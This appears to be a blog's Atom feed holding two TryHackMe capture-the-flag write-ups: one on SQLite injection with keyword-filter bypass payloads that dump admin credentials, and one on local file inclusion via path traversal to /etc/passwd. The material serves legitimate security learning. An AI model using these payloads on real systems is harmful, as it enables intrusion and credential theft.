@@ -1,0 +1,115 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+  <title>writeups on aviskase</title>
+  <id>https://www.aviskase.com/</id>
+  <updated>2025-02-05T19:03:58Z</updated>
+  <link rel="self" type="application/atom+xml" href="https://www.aviskase.com/categories/writeups/feeds/all.atom.xml" hreflang="en"/>
+  <link rel="alternate" type="text/html" href="https://www.aviskase.com/categories/writeups/" hreflang="en"/>
+  <entry>
+    <title>Writeup: TryHackMe Light</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/05/writeup-tryhackme-light/" hreflang="en"/>
+    <published>2025-02-05T19:03:58Z</published>
+    <updated>2025-02-05T19:03:58Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-05:/articles/2025/02/05/writeup-tryhackme-light/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/r/room/lightroom" class="external-link">Light</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: db</li>
+</ul>
+<p>I am working on a database application called Light! Would you like to try it out?  If so, the application is running on port 1337. You can connect to it using <code>nc MACHINE_IP 1337</code>. You can use the username <code>smokey</code> in order to get started.</p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info">
+    <ul>
+<li><a href="https://tryhackme.com/r/room/lightroom" class="external-link">Light</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: db</li>
+</ul>
+<p>I am working on a database application called Light! Would you like to try it out?  If so, the application is running on port 1337. You can connect to it using <code>nc MACHINE_IP 1337</code>. You can use the username <code>smokey</code> in order to get started.</p>
+</div>
+<p>Connect to the machine and try invalid and valid usernames:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nc MACHINE_IP <span style="color:#fab387">1337</span>
+</span></span><span style="display:flex;"><span>Welcome to the Light database!
+</span></span><span style="display:flex;"><span>Please enter your username: blah
+</span></span><span style="display:flex;"><span>Username not found.
+</span></span><span style="display:flex;"><span>Please enter your username: smokey
+</span></span><span style="display:flex;"><span>Password: vYQ5ngPpw8AdUmL
+</span></span></code></pre></div><p>Try a quote to check for injection vulnerabilities:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39;
+</span></span><span style="display:flex;"><span>Error: unrecognized token: &#34;&#39;smokey&#39;&#39; LIMIT 30&#34;
+</span></span></code></pre></div><p>Good, we&rsquo;re dealing with the database. Let&rsquo;s break out of the error with a comment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39;--
+</span></span><span style="display:flex;"><span>For strange reasons I can&#39;t explain, any input containing /*, -- or, %0b is not allowed :)
+</span></span></code></pre></div><p>Ok, no comments. We can do it differently:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: smokey&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: vYQ5ngPpw8AdUmL
+</span></span></code></pre></div><div class="callout note">
+    <p>After finishing the room I learned that you can do <code>smokey' '</code> to create a <a href="https://www.w3schools.com/sql/sql_alias.asp" class="external-link">SQL alias</a> with the same result.</p>
+</div>
+<p>So, there is some filtering here. And it also checks keywords:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: &#39; UNION 
+</span></span><span style="display:flex;"><span>Ahh there is a word in there I don&#39;t like :(
+</span></span></code></pre></div><p>At this point I guessed that room&rsquo;s name hinted at SQLite database. Using this <a href="https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf" class="external-link">SQLite explotaition paper</a> as a reference, let&rsquo;s enumerate tables and their structures. To escape keyword filtering we can use random letter cases.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39; UnioN Select group_concat(tbl_name) FRoM sqlite_master WhEre type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: usertable,admintable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT sql FroM sqlite_master WHerE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;usertable&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: CREATE TABLE usertable (
+</span></span><span style="display:flex;"><span>                   id INTEGER PRIMARY KEY,
+</span></span><span style="display:flex;"><span>                   username TEXT,
+</span></span><span style="display:flex;"><span>                   password INTEGER)
+</span></span><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT sql FroM sqlite_master WHerE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;admintable&#39; or &#39;
+</span></span><span style="display:flex;"><span>Password: CREATE TABLE admintable (
+</span></span><span style="display:flex;"><span>                   id INTEGER PRIMARY KEY,
+</span></span><span style="display:flex;"><span>                   username TEXT,
+</span></span><span style="display:flex;"><span>                   password INTEGER)
+</span></span></code></pre></div><p>We&rsquo;re ready to get flags. First flag: admin username.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT group_concat(username) FroM &#39;admintable&#39; WHERE id NOT NULL or &#39; 
+</span></span><span style="display:flex;"><span>Password: REDACTED,flag
+</span></span></code></pre></div><p>Second and third flags: admin passwords and flag value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username:-1&#39;  UnIon SeLeCT group_concat(password) FroM &#39;admintable&#39; WHERE id NOT NULL or &#39;
+</span></span><span style="display:flex;"><span>Password: REDACTED,REDACTED
+</span></span></code></pre></div><p>Or, to get a full table with all flags at once:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your username: -1&#39;  UnIon SeLeCT GROUP_CONCAT(username || &#39; &#39; || password, &#39;, &#39;) AS combined FroM &#39;admintable&#39; WHERE id NOT NULL or &#39;
+</span></span><span style="display:flex;"><span>Password: REDACTED REDACTED, flag REDACTED
+</span></span></code></pre></div>]]></content>
+  </entry>
+  <entry>
+    <title>Writeup: TryHackMe Lo-Fi</title>
+    <link rel="alternate" href="https://www.aviskase.com/articles/2025/02/03/writeup-tryhackme-lo-fi/" hreflang="en"/>
+    <published>2025-02-03T17:12:54Z</published>
+    <updated>2025-02-03T17:12:54Z</updated>
+    <author><name>Yuliya Bagriy</name></author><id>tag:www.aviskase.com,2025-02-03:/articles/2025/02/03/writeup-tryhackme-lo-fi/</id>
+    
+    <summary type="html"><![CDATA[<div class="callout info"><ul>
+<li><a href="https://tryhackme.com/r/room/lofi" class="external-link">Lo-Fi</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web</li>
+</ul>
+<p>Want to hear some lo-fi beats, to relax or study to? We&rsquo;ve got you covered!
+Check out similar content on TryHackMe:</p>
+<ul>
+<li>LFI Path Traversal</li>
+<li>File Inclusion</li>
+</ul></div>
+<p>Very simple room. Its description mentions <em>local file inclusion</em> vulnerability.</p>
+<p>Open the website at <code>http://MACHINE_IP</code>. There are links to other pages like this: <code>http://MACHINE_IP/?page=relax.php</code></p>]]></summary>
+    <content type="html"><![CDATA[<div class="callout info"><ul>
+<li><a href="https://tryhackme.com/r/room/lofi" class="external-link">Lo-Fi</a></li>
+<li>Difficulty: easy</li>
+<li>Platform: web</li>
+</ul>
+<p>Want to hear some lo-fi beats, to relax or study to? We&rsquo;ve got you covered!
+Check out similar content on TryHackMe:</p>
+<ul>
+<li>LFI Path Traversal</li>
+<li>File Inclusion</li>
+</ul></div>
+<p>Very simple room. Its description mentions <em>local file inclusion</em> vulnerability.</p>
+<p>Open the website at <code>http://MACHINE_IP</code>. There are links to other pages like this: <code>http://MACHINE_IP/?page=relax.php</code></p>
+<p>Attempt to get LFI <code>http://MACHINE_IP/?page=../../../etc/passwd</code> is working.</p>
+<p>Let&rsquo;s try to find a flag. I just stompted up in the directory hierarchy: <code>http://MACHINE_IP/?page=../../../flag.txt</code>. Success: <code>flag{REDACTED}</code>!</p>
+<p>Even though it is a very simple room, I still checked other writeups. And it was a good idea because here you can read about <a href="https://jaxafed.github.io/posts/tryhackme-lo-fi/#extra---rce" class="external-link">how to escalate LFI to RCE</a>.</p>
+]]></content>
+  </entry>
+</feed>
